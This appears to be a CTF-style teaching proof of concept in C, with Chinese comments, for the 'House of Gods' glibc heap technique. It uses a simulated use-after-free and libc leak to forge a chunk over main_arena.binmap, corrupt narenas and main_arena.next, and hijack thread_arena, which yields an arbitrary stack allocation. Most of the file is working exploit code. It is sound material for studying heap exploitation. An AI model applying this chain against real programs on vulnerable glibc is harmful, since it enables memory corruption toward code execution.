/*
 * 中文导读（CTF 版）
 *
 * 手法：House of Gods 原版最小链
 * 文件验证范围：glibc 2.24～2.25（另有独立 2.23 分支）。
 * 模拟漏洞：单个 unsorted chunk write-after-free，外加 heap/libc leak。
 * 核心流程：把 main_arena.binmap 当 fake chunk，覆盖 main_arena.next 与
 * system_mem，再通过 reused_arena 令 thread_arena 指向 fake arena。
 * 成功判据：后续 malloc 从 fake arena 的栈上 fastbin 返回 fake chunk。
 *
 * 重要边界：原作者写作“<2.27”，但 stock 2.26 已引入 tcache，公开源码
 * 不能无条件原样运行；它需要 tcache 路由与 Build-ID hidden 偏移适配。
 * 2.27 的 have_fastchunks 又破坏 main_arena fake chunk 的 size/bk 重叠，
 * 不能只改一个偏移继续把它称为原版单-UAF House of Gods。
 */

/* House of Gods 教学 PoC：逐步验证 binmap 伪块与 arena 劫持。 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <inttypes.h>

/*
 * House of Gods 是 arena 劫持技术：攻击者先把 main_arena 内部的 binmap
 * 字段解释成可从 unsorted bin 取出的伪 chunk，从而获得对 main_arena.next
 * 与 system_mem 的写；再放大 narenas，连续触发 reused_arena，使主线程的
 * thread_arena 最终指向攻击者伪造的 malloc_state。arena 被替换后，各 bin
 * 头都由攻击者控制，任意地址分配和后续代码执行就转化为常规链表伪造问题。
 *
 * 原版最小链需要：
 * - 约 8 次任意尺寸分配完成 arena 劫持，若继续到代码执行通常再需约 2 次；
 * - 能控制某个 chunk 用户区最前面的 5 个机器字；
 * - 对一个 unsorted chunk 的单次 write-after-free；
 * - 堆地址与 libc 地址泄漏。
 *
 * 本 PoC 为了逐步展示 binmap、unsorted 链与 fake arena，分配次数多于最小
 * 理论链。它最终只验证 thread_arena 被替换，并从伪 arena 的 fastbin 返回
 * 栈上 fake chunk；取得整个 arena 控制后如何连接任意代码执行不再展开。
 *
 * 完整原始说明：
 * https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT
 * 所利用的 glibc 缺陷报告：
 * https://sourceware.org/bugzilla/show_bug.cgi?id=29709
 *
 * 原作者：David Milosevic（milo）。原文声称覆盖 glibc 2.23~2.26，但本项目
 * 将“原代码直接成立”严格限定为 2.23~2.25；2.26 的 tcache 路由和 hidden
 * 符号偏移需要迁移适配，不能只把原 PoC 原样编译就宣称可用。
 */

/* <--- 利用流程从这里开始 ---> */

int main(void) {

    /*
     * 申请物理尺寸 0x90 的 small chunk。稍后把它整理进 smallbin，
     * mark_bin 会在 binmap 中设置可被解释成伪 size 的位。
     */
    void *SMALLCHUNK = malloc(0x88);

    /*
     * 申请第一个 fastbin chunk，物理尺寸 0x20；之后释放它，用其链表头
     * 在 main_arena 重叠位置伪造 binmap 伪块所需的 size 字段。
     */
    void *FAST20 = malloc(0x18);

    /*
     * 申请第二个 fastbin chunk，物理尺寸 0x40；其遗留 bk 数据和 fastbin
     * 链头位置稍后用于修补被重定向后的 unsorted 链。
     */
    void *FAST40 = malloc(0x38);

    /* 释放 SMALLCHUNK，使其进入 unsorted bin，fd/bk 同时留下 libc 指针。 */
    free(SMALLCHUNK);

    /*
     * 模拟 libc 泄漏：读取 unsorted victim 的 fd，也就是 main_arena 中
     * unsorted 表头附近的地址。后续 hidden 全局量都由该泄漏加减偏移定位。
     */
    const uint64_t leak = *((uint64_t*) SMALLCHUNK);

    /*
     * 请求比 SMALLCHUNK 大的 0xa0 物理块，迫使 unsorted 遍历无法直接使用
     * 0x90 victim，转而把它整理进 0x90 smallbin，并由 mark_bin 设置 binmap。
     */
    void *INTM = malloc(0x98);

    /*
     * 重新取出刚进入 smallbin 的 SMALLCHUNK。复用并非思想必需，只是让教学
     * 堆布局更紧凑，减少无关 chunk 对链表输出的干扰。
     */
    SMALLCHUNK = malloc(0x88);

    /* 再次释放复用后的 SMALLCHUNK，使其重新成为可通过 UAF 修改 bk 的 unsorted victim。 */
    free(SMALLCHUNK);

    /*
     * 核心漏洞原语：SMALLCHUNK 已释放到 unsorted，却仍通过旧指针覆盖其 bk。
     * 目标偏移把 bk 重定向到 main_arena.binmap 所构成的伪 chunk header。
     */
    *((uint64_t*) (SMALLCHUNK + 0x8)) = leak + 0x7f8;

    /*
     * FAST40 尚未释放时，其用户区第二个机器字并不是 fastbin 必需字段，可先
     * 写入 INTM 的 chunk header 地址。free(FAST40) 只更新 fd，不会清空这个
     * 预置 bk，于是 FAST40 虽位于 fastbin，仍能在伪 unsorted 链中提供指向
     * 已分配 INTM 的可解引用后继。
     *
     * 这样布置是为后面的 unsorted-bin attack 保留 INTM。不能靠申请 0x40
     * 来触发部分摘链，因为同尺寸请求会优先被 fastbin 满足，根本到不了
     * unsorted 遍历。
     */
    *((uint64_t*) (FAST40 + 0x8)) = (uint64_t) (INTM - 0x10);

    /* 释放 0x20 fastbin chunk，让对应 main_arena 槽位为伪块提供合法 size 位型。 */
    free(FAST20);

    /* 再释放 0x40 fastbin chunk，让其预留数据为伪 unsorted 链提供可解引用的 bk。 */
    free(FAST40);

    /*
     * 请求与 binmap 位型 0x200 对应的 0x1f8 用户大小；旧版 unsorted 路径
     * 把 main_arena 内的 binmap 伪块当作 exact fit 返回。
     */
    void *BINMAP = malloc(0x1f8);

    /*
     * 把 INTM 的 bk 改到 narenas-0x10。摘链写入位置是 bck->fd，即基址
     * 加 0x10，因而最终 unsorted 表头地址会覆盖 narenas。
     */
    *((uint64_t*) (INTM + 0x8)) = leak - 0xa20;

    /*
     * 把 main_arena.system_mem 置为最大值，放宽随后对重叠 main_arena
     * 伪 chunk 的尺寸上界检查，使真实堆/libc 指针也能被当作可接受的 size。
     */
    *((uint64_t*) (BINMAP + 0x20)) = 0xffffffffffffffff;

    /*
     * 按 exact fit 重新申请 INTM，触发表头与 narenas-0x10 之间的部分摘链，
     * 将巨大的 unsorted 表头地址写入 narenas，使其超过 arena 数量上限。
     */
    INTM = malloc(0x98);

    /*
     * BINMAP 返回指针覆盖 main_arena.next，把它改成 INTM 的 chunk header。
     * 连续两次 reused_arena 后，thread_arena 会采用同一地址。本例的 INTM
     * 并不是完整可靠的 malloc_state，只为了最小化演示“thread_arena 可被
     * 定向到任意已知地址”；下面再补足用到的 0x70 fastbin 槽即可验证控制。
     */
    *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (INTM - 0x10);

    /*
     * 第一次超大失败请求进入 reused_arena；遍历起点仍是当前 main_arena，
     * 因此 thread_arena 先被设置回真实 main_arena。
     */
    malloc(0xffffffffffffffbf + 1);

    /*
     * 第二次失败请求继续沿 arena 链遍历，读取已篡改的 main_arena.next，
     * 最终把 thread_arena 设置为攻击者选择的 fake arena。
     */
    malloc(0xffffffffffffffbf + 1);

    /* 在栈上构造物理尺寸 0x70 的 fake chunk，作为 arena 劫持后的分配目标。 */
    uint64_t fakechunk[4] = {

        0x0000000000000000, 0x0000000000000073,
        0x4141414141414141, 0x0000000000000000
    };

    /* 把 fake chunk header 地址写进 fake arena 的 0x70 fastbin 链头。 */
    *((uint64_t*) (INTM + 0x20)) = (uint64_t) (fakechunk);

    /* 此时 malloc 使用 thread_arena 指向的伪 arena，应从栈上返回 fake chunk。 */
    void *FAKECHUNK = malloc(0x68);

    /* 覆盖返回块的用户区；该地址与 fakechunk[2] 相同，用来验证任意地址分配。 */
    *((uint64_t*) (FAKECHUNK)) = 0x4242424242424242;

    /* 严格断言栈上目标值确实改变，排除 malloc 恰巧返回其他地址的假阳性。 */
    assert(fakechunk[2] == 0x4242424242424242);

    return EXIT_SUCCESS;
}
